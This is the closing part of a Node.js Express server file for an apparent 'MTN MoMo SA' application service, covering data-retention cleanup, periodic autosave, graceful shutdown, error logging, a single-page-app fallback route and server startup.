    const cutoff = Date.now() - RETENTION_DAYS * 86400000;
    let cleaned = 0;
    Object.keys(applications).forEach(id => {
        if (new Date(applications[id].createdAt).getTime() < cutoff) {
            delete applications[id];
            delete rejectionHistory[id];
            cleaned++;
        }
    });
    if (cleaned > 0) {
        saveApps();
        saveRejections();
        logInfo('cleanup_done', { cleaned });
    }
}, 86400000);

// Autosave every 30s
setInterval(saveApps, 30000);

let shuttingDown = false;
function shutdown(signal) {
    if (shuttingDown) return;
    shuttingDown = true;
    logInfo('shutdown_start', { signal });
    try { saveApps(); saveRejections(); saveRateLimits(); } catch (e) {}
    setTimeout(() => process.exit(0), 500);
}
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT', () => shutdown('SIGINT'));
process.on('uncaughtException', e => { logError('uncaught', { error: e.message, stack: e.stack }); });
process.on('unhandledRejection', e => { logError('unhandled_rejection', { error: String(e) }); });

// ============================================================
// STATIC & SPA FALLBACK
// ============================================================
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

// ============================================================
// BOOT
// ============================================================
loadAll();
app.listen(PORT, () => {
    logInfo('server_started', { port: PORT, env: NODE_ENV, dataDir: DATA_DIR });
    console.log(`\n🚀 MTN MoMo SA – Production Server v3.0`);
    console.log(`   → http://localhost:${PORT}`);
    console.log(`   → Health: http://localhost:${PORT}/health\n`);
});
